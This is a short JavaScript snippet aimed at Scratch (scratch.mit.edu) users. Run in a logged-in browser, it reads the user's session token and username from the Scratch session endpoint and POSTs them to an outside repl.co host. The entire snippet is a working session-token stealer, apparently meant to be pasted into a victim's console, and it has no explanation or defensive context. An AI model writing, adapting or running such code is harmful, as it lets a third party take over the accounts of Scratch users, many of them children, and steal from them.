(async()=>{
  let token=(await(await fetch("https://scratch.mit.edu/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.token;
  let username=(await(await fetch("https://scratch.mit.edu/session/",{headers:{"X-Requested-With":"XMLHttpRequest"}})).json()).user.username;
  await fetch("https://scratch.haru-ymth.repl.co",{method:"POST",body:JSON.stringify({username,token})});
})();
